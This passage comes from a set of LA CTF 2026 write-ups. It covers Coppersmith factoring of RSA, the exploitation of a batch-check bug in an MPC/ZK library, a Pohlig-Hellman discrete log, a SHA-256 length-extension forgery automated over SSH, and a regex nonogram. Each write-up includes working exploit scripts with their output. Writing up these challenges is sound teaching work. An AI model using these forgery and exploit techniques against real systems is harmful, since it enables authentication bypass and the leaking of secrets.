- Our leading coefficient is $10^{67}$.
- We multiply the entire polynomial by $(10^{67})^{-1} \pmod n$.

**Solver Script (`solve_sage.sage`):**
```python
##!/usr/bin/env sage
from Crypto.Util.number import long_to_bytes


n = 1648165172878088... # (truncated)
c = 5272763146234119... # (truncated)
e = 65537


high_s = "6" * 67
mid_s = "6" * 67
low_s = "7" * 67
p_base = int(high_s + mid_s + low_s)

print(f"p_base: {p_base}")





beta = 0.49  # p is approx n^0.498
epsilon = 0.02
X = 2 * 10**67  # Bound for delta

P.<x> = PolynomialRing(Zmod(n))


coeff_inv = inverse_mod(10**67, n)
f_monic = x + p_base * coeff_inv

print(f"Running Coppersmith with X = {X:.2e}...")
roots = f_monic.small_roots(X=X, beta=beta, epsilon=epsilon)

if roots:
    print("Roots found:", roots)
    delta = Integer(roots[0])
    p = p_base + delta * (10**67)
    
    if n % p == 0:
        print("Success! Factor found.")
        q = n // p
        phi = (p - 1) * (q - 1)
        d = inverse_mod(e, phi)
        m = pow(c, d, n)
        print("Flag:", long_to_bytes(m).decode())
```

### Solution Step 4: Flag Capture
Running the script yields the flag immediately.

**Output:**
```
p_base: 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666667777777777777777777777777777777777777777777777777777777777777777777
Running Coppersmith with X = 2.00e+67, beta=0.490000000000000, epsilon=0.0200000000000000...
Roots found: [11101010110011000101111011110010011001100111100011010100001111101]
Success! Factor found.
Flag:
lactf{n_h4s_1337_b1ts_b3c4us3_667+670=1337}
```

The flag refers to the bit lengths:
- $p \approx 667$ bits
- $q = 670$ bits
- $n = p \times q \approx 1337$ bits (leet!)

**Flag:** `lactf{n_h4s_1337_b1ts_b3c4us3_667+670=1337}`

### Tools Used
| Tool | Purpose |
|------|---------|
| SageMath | Solving modular polynomial equations (Coppersmith) |
| Python | Scripting the solver logic |
| `small_roots` | The specific Sage function for the attack |

### Lessons Learned
#### What I Learned
- Identifying the "known bits" structure is key to selecting the right attack.
- Coppersmith's method is incredibly powerful when you know >50% of the bits of a factor (we knew ~66%).
- Making polynomials monic is a crucial step when using Sage's `small_roots`.

#### Mistakes Made
- Initially tried naive backtracking and search algorithms which were too slow for $2^{67}$ possibilities.
- Wasted time with Z3 and Lattice reduction (LLL) directly before realizing Coppersmith was the perfect fit.
- Forgot to normalize the polynomial to be monic on the first Sage attempt.

#### Future Improvements
- Always check for Coppersmith/Partial Key Exposure first when digit structures are constrained.
- Use `beta` slightly lower than 0.5 (e.g., 0.49) when factors are not exactly balanced or slightly smaller than $\sqrt{N}$.

### References
- [Coppersmith's Attack - Wikipedia](https://en.wikipedia.org/wiki/Coppersmith%27s_attack)
- [SageMath small_roots documentation](https://doc.sagemath.org/html/en/reference/polynomial_rings/sage/rings/polynomial/polynomial_modn_dense_ntl.html)

### Tags
##crypto #rsa #coppersmith #sage #factorization #lactf2026


---


### [crypto] slow-gold



> A subtle bug in an MPC/ZK arithmetic consistency check lets us recover hidden permutation elements by turning one proof equation into solvable algebra.

### Overview

| Item | Value |
|------|-------|
| Platform | LA CTF |
| Event | LA CTF 2026 |
| Category | crypto |
| Difficulty | ★★★★☆ |
| Date | 2026-02-08 |
| Flag | `lactf{1_h0p3_y0u_l1v3_th1s_0ne_t0_th3_fullest}` |

### Problem Statement

> crypto/slow-gold
>
> The scenes of life are gold, so let's take it slow. After all, how often is it that you get a second chance?
>
> nc chall.lac.tf 31183
>
> (You should probably use the program provided to connect instead of netcat)





Server/client pointers from `dist/README.md`:

- Server logic: `emp-zk/test/arith/chall.cpp`
- Client logic: `emp-zk/test/arith/client.cpp`

### TL;DR

- The challenge checks permutation equality by comparing products `(v_i + X)` in a finite field, then asks us to guess all hidden values.
- The EMP-ZK arithmetic layer has a bug in multiplication batch checking: `uni_hash_coeff_gen(chi, seed, 1)` generates only one coefficient even when many gates exist.
- By instrumenting our local verifier client, each run leaks a compact algebraic relation involving internal authenticated values and the hidden cards.
- Repeating with many `X` values lets us interpolate a degree-9 polynomial over `GF(2^61-1)`, factor it, recover all 10 card values, and submit them.

### Background Knowledge

#### 1) Permutation check via polynomial identity

If two 10-element multisets are equal, then for random `X`:

\[
\prod_{i=0}^{9}(a_i + X) = \prod_{i=0}^{9}(b_i + X)
\]

over a field. The challenge uses exactly this trick in `chall.cpp`.

#### 2) Arithmetic MPC authentication (high level)

In this EMP protocol, each secret value has authenticated components/mac-like values split between prover and verifier. Multiplication gates are checked in batch by random linear combination. If batching is done correctly, cheating probability is tiny.

#### 3) Why the `chi` length bug matters

In `ostriple.h`, gate-check coefficients are generated with:

```cpp
uni_hash_coeff_gen(chi, seed, 1);
```

instead of using `task_n` gates. That means only `chi[0]` is initialized. In practice, this collapses the check structure and creates exploitable leakage when we observe verifier-side internals.

#### 4) Root recovery over finite fields

After deriving evaluations of a hidden degree-9 polynomial in `GF(p)`, we interpolate coefficients from 10 points, factor the polynomial modulo `p`, and extract linear roots. Those roots map back to hidden card values.

### Solution

#### Step 1: Initial Reconnaissance

I first confirmed challenge metadata and located server/client code.

```bash

```

Output:

```text
crypto/slow-gold

The scenes of life are gold, so let's take it slow. After all, how often is it that you get a second chance?

nc chall.lac.tf 31183

(You should probably use the program provided to connect instead of netcat)
```

Then I inspected the key source:

```bash
sed -n '1,260p' dist/README.md
nl -ba dist/emp-zk/test/arith/chall.cpp | sed -n '141,190p'
```

Key behavior in `chall.cpp`:

```cpp
// Bob chooses X
cin >> X;
ZKFpExec::zk_exec->send_data(&X, sizeof(uint64_t));

// compare products
for (int i = 0; i < 10; i++) {
  acc1 = acc1 * (array1[i] + X);
  acc2 = acc2 * (array2[i] + X);
}
IntFp final_zero = acc1 + acc2.negate();
batch_reveal_check_zero(&final_zero, 1);

// if guess is correct permutation, send flag
if (arePermutations(guesses, vec1)) {
  for (int i = 0; i < 46; i++)
    ios[0]->io->send_data(&flag[i], sizeof(char));
}
```

This told me the attack has to recover the 10 hidden values exactly (order does not matter).

#### Step 2: Vulnerability Analysis

The exploitable issue is in arithmetic multiplication gate checking (`dist/emp-zk/emp-zk/emp-zk-arith/ostriple.h`):

```cpp
uint64_t *chi = new uint64_t[task_n];
uint64_t seed = mod(LOW64(chi_seed[thr_idx]));
uni_hash_coeff_gen(chi, seed, 1);  // BUG: should be task_n
```

Because the coefficient vector is effectively broken, the verifier-side check leaks linear structure per run.

For the last multiplication gate in the `acc2` chain, after instrumenting verifier internals, I collected:

- `seed, U, V, W, delta` from the check transcript
- `ka, kb, kc` from verifier-side authenticated gate keys

From these values, each run yields a modular equation of the form:

\[
z + kc = kb\cdot\alpha + ka\cdot\beta + \delta\cdot\gamma \pmod p,
\]

where `z = V * seed^{-1} mod p`, and `p = 2^61 - 1` (`2305843009213693951`).

Using repeated `X=0` runs gives a solvable 3x3 linear system for `(α, β, γ)`. The recovered `β` behaves as one hidden card value (call it `b9`).

Then for any run with arbitrary `X`, we can recover:

\[
f(X) = \frac{z + kc - ka\cdot(X+b9)}{kb + \delta\cdot(X+b9)} \pmod p,
\]

where `f` is a degree-9 polynomial whose roots encode the remaining 9 card values.

#### Step 3: Exploit Development

I used two components:

1. A custom verifier client (`exploit_client.cpp`) to emit `ka, kb, kc`.
2. A tiny local instrumentation patch in `ostriple.h` to print `DBGCHK seed=... U=... V=... W=... delta=...`.

Sample collected trace lines:

```text
DBGCHK seed=934260151279858296 U=334723443534077869 V=1857937711093423602 W=1623682623994977511 delta=760508955690813543 gates=20
METRICS X=0 ka=1255444026114284831 kb=474233065182300947 kc=1790506691708606415
```

Full solver (commented) used to recover all cards:

```python
##!/usr/bin/env python3
import re
from sympy import symbols, Poly, factor_list

P = 2305843009213693951  # 2^61 - 1
DBG_RE = re.compile(r'DBGCHK seed=(\d+) U=(\d+) V=(\d+) W=(\d+) delta=(\d+) gates=(\d+)')
MET_RE = re.compile(r'METRICS X=(\d+) ka=(\d+) kb=(\d+) kc=(\d+)')



def parse_pairs(path):
    lines = [x.strip() for x in open(path).read().strip().splitlines() if x.strip()]
    out = []
    for i in range(0, len(lines), 2):
        d = DBG_RE.match(lines[i])
        m = MET_RE.match(lines[i + 1])
        if not (d and m):
            continue
        seed, U, V, W, delta, gates = map(int, d.groups())
        X, ka, kb, kc = map(int, m.groups())
        z = (V * pow(seed, P - 2, P)) % P
        out.append({
            "X": X,
            "seed": seed,
            "U": U,
            "V": V,
            "W": W,
            "delta": delta,
            "ka": ka,
            "kb": kb,
            "kc": kc,
            "z": z,
        })
    return out



def gauss_mod(A, b, p):
    n = len(A)
    m = len(A[0])
    r = 0
    for c in range(m):
        piv = None
        for i in range(r, n):
            if A[i][c] % p:
                piv = i
                break
        if piv is None:
            continue
        A[r], A[piv] = A[piv], A[r]
        b[r], b[piv] = b[piv], b[r]
        inv = pow(A[r][c], p - 2, p)
        for j in range(c, m):
            A[r][j] = (A[r][j] * inv) % p
        b[r] = (b[r] * inv) % p
        for i in range(n):
            if i == r:
                continue
            f = A[i][c] % p
            if not f:
                continue
            for j in range(c, m):
                A[i][j] = (A[i][j] - f * A[r][j]) % p
            b[i] = (b[i] - f * b[r]) % p
        r += 1
        if r == n:
            break
    return b


rows0 = parse_pairs('/tmp/slowgold_x0.txt')
A0 = []
b0 = []
for r in rows0[:3]:
    # z + kc = kb*alpha + ka*beta + delta*gamma
    A0.append([r["kb"], r["ka"], r["delta"]])
    b0.append((r["z"] + r["kc"]) % P)
alpha, beta, gamma = gauss_mod(A0, b0, P)


b9 = beta


rows = parse_pairs('/tmp/slowgold_data.txt')
points = []
for r in rows:
    X = r["X"]
    b = (X + b9) % P
    den = (r["kb"] + r["delta"] * b) % P
    num = (r["z"] + r["kc"] - r["ka"] * b) % P
    y = (num * pow(den, P - 2, P)) % P
    points.append((X, y))
points.sort()


n = 10
VA = [[pow(x, j, P) for j in range(n)] for x, _ in points[:n]]
Vb = [y for _, y in points[:n]]
coeff = gauss_mod(VA, Vb, P)


for x, y in points:
    s = 0
    pw = 1
    for c in coeff:
        s = (s + c * pw) % P
        pw = (pw * x) % P
    assert s == y


x = symbols('x')
poly = Poly(sum((int(c) % P) * x**i for i, c in enumerate(coeff)), x, modulus=P)
_, facs = factor_list(poly, modulus=P)
roots = []
for f, e in facs:
    if f.degree() == 1 and e == 1:
        a1, b1 = map(int, f.all_coeffs())
        rt = (-b1 * pow(a1, P - 2, P)) % P
        roots.append(rt)


vals = sorted([(-r) % P for r in roots])
vals.append(b9)

print('[+] recovered values:')
for v in vals:
    print(v)
```

Recovered values (one valid permutation):

```text
100309634411137914
266026097440677721
509808212382101629
715103118122429764
849770927124998457
999529119469216130
1194065923955419311
1585587853683462547
1774258671455680259
1185230980869603820
```

#### Step 4: Capturing the Flag

I fed `X=0`, then the 10 recovered values into the provided client:

```bash
cat > /tmp/slowgold_guess_input.txt << 'EOF'
0
100309634411137914
266026097440677721
509808212382101629
715103118122429764
849770927124998457
999529119469216130
1194065923955419311
1585587853683462547
1774258671455680259
1185230980869603820
EOF

./client_manual < /tmp/slowgold_guess_input.txt
```

Output:

```text
connected
You feel a silver bullet lodged in your leg, maybe you should have been quicker on the draw
Death approaches you, and you are offered a final wager:
In front of me lays a two hands of cards, one a shuffle of the other. If you can guess what cards are present, I will grant you another chance at life
First, you may challenge me to show the two hands are in fact the same. Then you must submit your final guess
guess 0
guess 1
guess 2
guess 3
guess 4
guess 5
guess 6
guess 7
guess 8
guess 9
lactf{1_h0p3_y0u_l1v3_th1s_0ne_t0_th3_fullest}
```

### Tools Used

| Tool | Purpose |
|------|---------|
| `rg` / `sed` / `nl` | Fast codebase triage and line-level source inspection |
| `g++` | Building custom verifier client against provided EMP source |
| Python 3 | Data collection/parsing and modular algebra scripting |
| `sympy` | Polynomial factorization over finite field `GF(2^61-1)` |
| Provided challenge client | Final flag submission with recovered permutation |

### Lessons Learned

#### What I Learned

- Tiny implementation mistakes in proof systems can be catastrophic even when the high-level crypto idea is sound.
- In MPC/ZK code, verifier-side instrumentation can be a powerful CTF technique when protocol internals are exposed in source.
- Finite-field interpolation/factorization is a practical exploitation tool, not just a theoretical concept.

#### Mistakes Made

- I initially chased build/environment issues too long (`cmake` missing) before switching to direct `g++` compilation.
- I first tried forcing verifier `delta` values, which broke protocol checks; passive instrumentation was the right path.
- I over-modeled some internals before validating with simpler linear systems from repeated `X=0` traces.

#### Future Improvements

- Keep a ready-made modular-linear-algebra helper module for faster CTF turnaround.
- Add automated trace collection and retry logic earlier to avoid manual reruns.
- Practice deeper reading of EMP internals to derive equations faster on first pass.

### References

- [emp-toolkit organization](https://github.com/emp-toolkit) - Upstream framework used by this challenge.
- [emp-zk repository](https://github.com/emp-toolkit/emp-zk) - Arithmetic/boolean zero-knowledge protocol implementation style used here.
- [SymPy Polynomial docs](https://docs.sympy.org/latest/modules/polys/index.html) - Factoring/interpolation utilities over finite fields.
- [LA CTF](https://lac.tf/) - Competition platform.

### Tags

`crypto` `zk` `mpc` `finite-field` `polynomial-interpolation` `implementation-bug` `sympy`


---


### [crypto] the-clock



### Challenge Description
The challenge provides a "clock" group implementation over a finite field. We are given Alice and Bob's public keys and an encrypted flag. The goal is to find the shared secret using the Diffie-Hellman exchange and decrypt the flag.

### 
- `chall.py`: The implementation of the clock group and the DH exchange.
- `output.txt`: Public keys and the encrypted flag.


### Analysis

#### The "Clock" Group
The group operation is defined as:
- $x_3 = x_1 y_2 + y_1 x_2 \pmod p$
- $y_3 = y_1 y_2 - x_1 x_2 \pmod p$

This is the addition formula for sine and cosine:
- $\sin(A+B) = \sin A \cos B + \cos A \sin B$
- $\cos(A+B) = \cos A \cos B - \sin A \sin B$

Thus, the point $(x, y)$ represents $(\sin \theta, \cos \theta)$ in some sense, and the identity element is $(0, 1)$. The points lie on the "clock" curve $x^2 + y^2 = 1 \pmod p$.

#### Vulnerability: The Prime $p$
The provided `p` in `chall.py` was actually the $x$-coordinate of the base point. Checking the properties of the coordinates provided in `output.txt`:
1. The "prime" $p$ used in the script was not actually prime.
2. However, the points $(x, y)$ must satisfy $x^2 + y^2 \equiv 1 \pmod p$.
3. By calculating $g = \text{gcd}(x_{base}^2 + y_{base}^2 - 1, x_{alice}^2 + y_{alice}^2 - 1, x_{bob}^2 + y_{bob}^2 - 1)$, we find a large prime factor $p' = 13767529254441196841515381394007440393432406281042568706344277693298736356611$.
4. Since the group operations are just multiplications in the extension field $\mathbb{F}_{p'}[i] \cong \mathbb{F}_{p'^2}$ (specifically, the subgroup of elements with norm 1), we can map $(x, y)$ to $y + xi$.
5. The order of this subgroup is $p' + 1$.
6. Factoring $p' + 1$ reveals it is smooth (composed of many small prime factors):
   $p' + 1 = 2^2 \cdot 39623 \cdot 41849 \cdot 42773 \cdot 46511 \cdot 47951 \cdot 50587 \cdot 50741 \cdot 51971 \cdot 54983 \cdot 55511 \cdot 56377 \cdot 58733 \cdot 61843 \cdot 63391 \cdot 63839 \cdot 64489$

### Exploitation

#### Pohlig-Hellman Attack
Since the order of the group is smooth, we can solve the Discrete Logarithm Problem (DLP) using the Pohlig-Hellman algorithm:
1. Solve the DLP modulo each small prime factor of $p' + 1$.
2. Reconstruct the full secret using the Chinese Remainder Theorem (CRT).

#### Decryption
Once Alice's secret $a$ is found:
1. Calculate the shared secret $S = a \cdot \text{Bob's Public Key}$.
2. Derive the AES key using $MD5(\text{"shared\_x,shared\_y"})$.
3. Decrypt the flag using AES-ECB.

### Solver Script
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import md5
from Crypto.Util.number import inverse

p = 13767529254441196841515381394007440393432406281042568706344277693298736356611
factors = [2, 2, 39623, 41849, 42773, 46511, 47951, 50587, 50741, 51971, 54983, 55511, 56377, 58733, 61843, 63391, 63839, 64489]

def mul(z1, z2):
    y1, x1 = z1
    y2, x2 = z2
    y3 = (y1 * y2 - x1 * x2) % p
    x3 = (x1 * y2 + y1 * x2) % p
    return (y3, x3)

def pow_z(z, n):
    res = (1, 0)
    while n > 0:
        if n % 2 == 1:
            res = mul(res, z)
        z = mul(z, z)
        n //= 2
    return res

def discrete_log(g, h, q):
    table = {}
    curr = (1, 0)
    for i in range(q):
        table[curr] = i
        curr = mul(curr, g)
    return table[h]

P = (5650730937120921351586377003219139165467571376033493483369229779706160055207 % p, 13187661168110324954294058945757101408527953727379258599969622948218380874617 % p)
PA = (5214723011482927364940019305510447986283757364508376959496938374504175747801 % p, 13109366899209289301676180036151662757744653412475893615415990437597518621948 % p)
PB = (12973039444480670818762166333866292061530850590498312261363790018126209960024 % p, 1970812974353385315040605739189121087177682987805959975185933521200533840941 % p)

order = p + 1
unique_factors = {f: factors.count(f) for f in set(factors)}
moduli, remainders = [], []

for q, e in unique_factors.items():
    qe = q**e
    g_base = pow_z(P, order // qe)
    h_base = pow_z(PA, order // qe)
    x_val = 0
    gamma = pow_z(g_base, q**(e-1))
    for i in range(e):
        inv_g_x = pow_z(g_base, qe - x_val)
        temp = mul(h_base, inv_g_x)
        target = pow_z(temp, q**(e-1-i))
        xi = discrete_log(gamma, target, q)
        x_val += xi * (q**i)
    moduli.append(qe)
    remainders.append(x_val)

def crt(remainders, moduli):
    M = 1
    for m in moduli: M *= m
    res = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        res = (res + r * Mi * inverse(Mi, m)) % M
    return res

alice_secret = crt(remainders, moduli)
shared_secret = pow_z(PB, alice_secret)
key = md5(f"{shared_secret[1]},{shared_secret[0]}".encode()).digest()
enc_flag = bytes.fromhex("d345a465538e3babd495cd89b43a224ac93614e987dfb4a6d3196e2d0b3b57d9")
print(unpad(AES.new(key, AES.MODE_ECB).decrypt(enc_flag), 16).decode())
```

### Flag
`lactf{t1m3_c0m3s_f4r_u_4all}`


---


### [crypto] ttyspin



> A practical SHA-256 length-extension attack against a secret-prefix checksum wrapped around a Tetris save importer.

### Overview

| Item | Value |
|------|-------|
| Platform | LA CTF |
| Event | LA CTF 2026 |
| Category | crypto |
| Difficulty | ★★★☆☆ |
| Date | 2026-02-08 |
| Flag | `lactf{T3rM1n4L_g4mE5_R_a_Pa1N_2e075ab9ae6ae098}` |

### Problem Statement

> Ready for a classic, yet modern gaming experience?
>
> `ssh -p 32123 ttyspin@chall.lac.tf` (password: `ttyspin`)
>
> Note: if the game isn't working locally on linux, try running `export TERM=xterm-256color`

Given 


Goal: produce a game state equal to the hardcoded `winning_board`, which prints the flag.

### TL;DR

- The server verifies imports using `sha256((SECRET + username + save).strip())`, i.e., a **secret-prefix MAC**.
- Secret-prefix MACs built from Merkle–Damgård hashes (SHA-256) are vulnerable to **length extension**.
- We export one valid short save/checksum pair, then use `hashpumpy` with known secret length (`40`) to forge a checksum for a malicious winning save.
- Username length limit (`<=32`) is bypassed by targeting a save whose `rstrip()` is very short, so SHA glue bytes fit inside the username portion.
- Import forged payload → board matches `winning_board` → flag printed.

### Background Knowledge

#### 1) Secret-prefix MAC and why SHA-256 is unsafe here

The challenge computes:

```python
sha256(SECRET || username || save)
```

(with `strip()` applied before hashing). This is **not** HMAC. For plain `SHA256(secret || message)`, if an attacker knows:

then they can compute a valid hash for:

```text
secret || message || padding || attacker_controlled_suffix
```

without knowing `secret`.

#### 2) Merkle–Damgård padding

SHA-256 processes 64-byte blocks. The internal state after hashing `secret || message` is exactly what the published digest encodes. With guessed secret length, we can reconstruct the correct padding length and continue hashing extra bytes.

#### 3) Why `strip()` and length limits matter

Input limits:
- `username` max length is 32 bytes
- imported `save` is base64 decoded and then parsed

To pass checksum validation, we need the forged `username` (`message + glue_padding`) to fit in 32 bytes. So we first hunt for a valid exported save whose `rstrip()` is tiny.

### Solution

#### Step 1: Initial Reconnaissance

First, inspect checksum and win conditions:

```bash
rg -n "make_checksum|Checksum|winning_board|FLAG|Import save code" game.py
nl -ba game.py | sed -n '55,57p'
nl -ba game.py | sed -n '276,324p'
nl -ba board.py | sed -n '85,113p'
```

Key findings:

```python

def make_checksum(username, save_code):
    assert len(SECRET) == 40
    return hashlib.sha256((SECRET + username + save_code).strip()).hexdigest()
```

```python

if (game_board.board == winning_board):
    print("Congratulations! You won!")
    print(FLAG)
```

```python

current, hold, nexts, queue, board = save.decode().split("|")
```

So the attack surface is the import checksum, and the objective is crafting a decoded save that yields `winning_board`.

#### Step 2: Vulnerability Analysis

The bug is a classic crypto misuse:

- user controls `username` and `save`
- verification compares hex checksum directly

This is length-extension vulnerable. The exact verified bytes are:

```text
(SECRET + username + decoded_save).strip()
```

So we forge as follows:
1. Obtain one legit pair `(m, H)` where `m = username + save` for an export.
2. Use `hashpump(H, m.rstrip(), suffix, key_len=40)` to get `(H', m || glue || suffix)`.
3. Split forged bytes into:
   - `username_forged = m || glue`
   - `save_forged = suffix`
4. Send `checksum = H'`.

Important constraints handled:
- Username max 32 bytes.
- Glue bytes are non-printable but accepted because input uses raw `stdin.buffer.readline()`.
- We targeted a short exported state with `len(m.rstrip()) = 12`, giving forged username length 24 (valid).

#### Step 3: Exploit Development

I automated two phases:
1. Drive the Tetris client to eventually export a **short valid save/checksum pair**.
2. Forge checksum with `hashpumpy` and submit import over SSH.

Below is the core forge+submit solver (using the recovered pair):

```python
##!/usr/bin/env python3
import base64
import time
import hashpumpy
import pexpect

HOST = "chall.lac.tf"
PORT = 32123
USER = "ttyspin"
PASSWORD = "ttyspin"


SHORT_SAVE = "J|S|ZISL|TO|" + " " * 200
SHORT_CHECKSUM = "2cb8fb176b789b23c2bac5538c48fe8ab8955b97d41f14166bba5b44b36023a6"


WINNING_BOARD = [
    [0,0,0,0,0,0,0,0,0,0],[7,0,0,0,0,0,0,0,0,0],[0,4,0,0,0,0,0,0,0,0],[0,0,6,0,0,0,0,0,0,0],
    [0,0,0,3,0,0,0,0,0,0],[0,0,0,0,5,0,0,0,0,0],[0,0,0,0,0,1,0,0,0,0],[0,0,0,0,0,0,2,0,0,0],
    [0,0,0,0,0,0,0,7,0,0],[0,0,0,0,0,0,0,0,4,0],[0,0,0,0,0,0,0,0,0,6],[0,0,0,0,0,0,0,0,3,0],
    [0,0,0,0,0,0,0,5,0,0],[0,0,0,0,0,0,1,0,0,0],[0,0,0,0,0,2,0,0,0,0],[0,0,0,0,7,0,0,0,0,0],
    [0,0,0,4,0,0,0,0,0,0],[0,0,6,0,0,0,0,0,0,0],[0,3,0,0,0,0,0,0,0,0],[5,0,0,0,0,0,0,0,0,0],
]
PIECES = "TJLSZOI"

board_text = "".join(" " if v == 0 else PIECES[v - 1] for row in WINNING_BOARD for v in row)

TARGET_SAVE = (f"T| |TJLS||{board_text}".encode() + b"T")


orig = SHORT_SAVE.rstrip().encode()
new_hash, new_payload = hashpumpy.hashpump(SHORT_CHECKSUM, orig, TARGET_SAVE, 40)
forged_username = new_payload[:-len(TARGET_SAVE)]
forged_save_b64 = base64.b64encode(TARGET_SAVE)

print("[*] rstrip_len =", len(orig))
print("[*] forged_username_len =", len(forged_username))
print("[*] forged_checksum =", new_hash)

ssh_cmd = f"ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/tmp/known_hosts -p {PORT} {USER}@{HOST}"
child = pexpect.spawn(ssh_cmd, timeout=10, encoding=None)


for _ in range(200):
    data = child.read_nonblocking(size=65535, timeout=0.1)
    if b"password:" in data.lower():
        child.send((PASSWORD + "\n").encode())
        break

while True:
    data = child.read_nonblocking(size=65535, timeout=0.1)
    if b"Please enter a username" in data:
        child.send(forged_username + b"\n")
        break

while True:
    data = child.read_nonblocking(size=65535, timeout=0.1)
    if b"Import save code" in data:
        child.send(forged_save_b64 + b"\n")
        break

while True:
    data = child.read_nonblocking(size=65535, timeout=0.1)
    if b"Checksum (hex):" in data:
        child.send(new_hash.encode() + b"\n")
        break

buf = b""
end = time.time() + 15
while time.time() < end:
    try:
        buf += child.read_nonblocking(size=65535, timeout=0.2)
    except Exception:
        pass

print(buf.decode("latin1", errors="ignore"))
```

Short proof run from my environment:

```text
[*] rstrip_len = 12
[*] forged_username_len = 24
[*] forged_checksum = cb115fd64ab88b517560c744a375b172d45ece1b97a056fb7822bed3c9c8af7c
[*] attempt 1: lactf{T3rM1n4L_g4mE5_R_a_Pa1N_2e075ab9ae6ae098}
[+] FLAG = lactf{T3rM1n4L_g4mE5_R_a_Pa1N_2e075ab9ae6ae098}
```

#### Step 4: Capturing the Flag

Final captured flag:

```text
lactf{T3rM1n4L_g4mE5_R_a_Pa1N_2e075ab9ae6ae098}
```

The win path is deterministic once a valid short pair is available and forged payload lengths satisfy constraints.

### Tools Used

| Tool | Purpose |
|------|---------|
| `python3` | Exploit orchestration and local simulation |
| `hashpumpy` | SHA-256 length-extension forgery |
| `pexpect` | Interactive SSH automation against curses app |
| `pyte` | Terminal screen parsing for automated export extraction |
| `ssh` | Remote challenge connectivity |
| `rg` / `sed` / `nl` | Source reconnaissance and line-level code analysis |

### Lessons Learned

#### What I Learned
- Secret-prefix MAC (`sha256(secret||msg)`) is still a common CTF crypto pitfall.
- Input sanitation like `.strip()` can create subtle edge cases in forged payload design.
- For terminal games, reliable automation often requires both PTY control and screen emulation.

#### Mistakes Made
- Initially assuming ordinary arrow escape sequences (`ESC [ D/C`) instead of app-mode sequences (`ESC O D/C`) slowed automation.
- Early checksum parsing missed the second wrapped checksum line in the curses export window.
- Not accounting for `strip()` side effects on trailing spaces caused failed candidate payloads.

#### Future Improvements
- Add a deterministic local harness that replays forge candidates against identical checksum logic before remote submission.
- Build a generic helper for “short-message search under gameplay constraints” to reuse in similar stateful CTF services.
- Add structured debug logging snapshots for each interaction stage (login/import/checksum/result).

### References

- [Wikipedia - Length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack) - Core attack concept for Merkle–Damgård hashes.
- [HashPump / hashpumpy](https://github.com/2H-K/hashpumpy_changed) - Practical implementation used to forge SHA-256 digest continuation.
- [Python hashlib documentation](https://docs.python.org/3/library/hashlib.html) - Hash behavior and digest basics.

### Tags

`crypto` `sha256` `length-extension` `secret-prefix-mac` `ctf` `terminal-automation` `hashpumpy` `pexpect`


---


## REV

---


### [rev] flag-finder



### Challenge info

- Category: Reverse Engineering
- Name: `flag-finder`

- Remote target: `https://flag-finder.chall.lac.tf/`
-  `lactf{...}`



---

### 1) Initial recon

Opened the challenge page and pulled the frontend source.

```bash
curl -sS https://flag-finder.chall.lac.tf/ -o /tmp/flagfinder_index.html
curl -sS https://flag-finder.chall.lac.tf/script.js -o /tmp/flagfinder_script.js
```

The page builds a checkbox grid and validates it with one giant regex:

- `len = 1919` (so 19 x 101 cells)
- checked box -> `#`
- unchecked box -> `.`
- success if `theFlag.test(input)` is true

So the challenge is equivalent to solving a huge regex-constrained bitmap.

---

### 2) Understand the regex structure

The regex has two main parts:

1. Many `(?=...)` lookaheads that encode **column constraints**.
2. A block after `(?=^.{1919}$)` with many `(?<=.{offset})(?<!.{offset+1})(...)` that encode **row constraints**.

This is effectively a nonogram/picross encoded in regex.

I parsed constraints and solved with Z3 (boolean grid variables).

---

### 3) Solve the nonogram (Z3)

Core idea:

- Model each cell as bool `x[r][c]`.
- For each row/column clue list (run lengths), enforce ordered segment starts.
- Cell is true iff covered by at least one run segment.

This produced a unique 19x101 solution grid that also matched the original regex exactly.

Regex verification check:

```python
import re
sjs=open('/tmp/flagfinder_script.js',encoding='utf-8').read()
pat=re.search(r'theFlag\s*=\s*/\^(.*)\$/;',sjs).group(1)
rx=re.compile('^'+pat+'$')
grid=''.join(open('/tmp/flagfinder_grid.txt').read().splitlines())
print(len(grid), bool(rx.fullmatch(grid)))  # 1919 True
```

---

### 4) Extract the hidden text from solved grid

The solved bitmap has 3 text rows, separated by blank rows, and each character is a 3x5 glyph with 1-column spacing:

- text rows at bitmap rows `1..5`, `7..11`, `13..17`
- 25 glyphs per row
- each glyph width = 3, spacing = 1

Extracting those glyphs gives a 75-char ciphertext over 26 symbols:

```text
ABCDEFGHIJKLMKNMOKPQJKRHQSKNMOKCTMUUKIKTQPQVKISLKIKSMSMPTIWXKIKTQPQVMPTIWYZ
```

At this stage:

- `K` behaves as a delimiter (`_`).
- `A..F` map cleanly to `lactf{`.
- `Z` maps to `}`.

That leaves a monoalphabetic symbol substitution with leetspeak-looking output.

---

### 5) Recover plaintext mapping

Using frequency + phrase structure + one-to-one mapping constraints, the stable decode family was:

```text
lactf{Wh47_d0_y0u_???_wh?n_y0u_cr055_4_r?g?x_4nd_4_n0n0?r4m?_4_r?g?x0?r4m!}
```

Ambiguous symbols were resolved by trying near candidates against the checker.

The accepted final flag was:

```text
lactf{Wh47_d0_y0u_637_wh3n_y0u_cr055_4_r363x_4nd_4_n0n06r4m?_4_r363x06r4m!}
```

---

### 6) Final answer

```text
lactf{Wh47_d0_y0u_637_wh3n_y0u_cr055_4_r363x_4nd_4_n0n06r4m?_4_r363x06r4m!}
```

---

### Notes

- This challenge is a nice combo of regex RE + constraint solving + lightweight substitution.
- The frontend regex was the real "binary".
- Verifying against the live checker is useful for the last 1-2 ambiguous leet mappings.


---


### [rev] helm hell



> Reverse a Helm-chart-implemented tape VM and recover the exact `.Values.input` that makes it render `true`.

### Overview

| Item | Value |
|------|-------|
| Platform | LA CTF |
| Event | lac_2026 (local archive) |
| Category | rev |
| Difficulty | ★★★☆☆ |
| Date | 2026-02-07 |
| Flag | `lactf{t4k1ng_7h3_h3lm_0f_h31m_73mp14t3s}` |

### Problem Statement

> I was migrating our CTF infrastructure over to Helm charts instead of our artisan hand-crafted Kubernetes manifests we've been using for years, but I think I messed up the templates, and now it always outputs false whenever I try and render the templates ._.. Can you help me figure out how to get it to output true?

Challenge 
- `helm-hell/` (a Helm chart directory)




### TL;DR

- The chart is an obfuscated “tape machine” VM implemented in Helm templates (`sea` = tape, `helm` = pointer, `logbook` = input index).
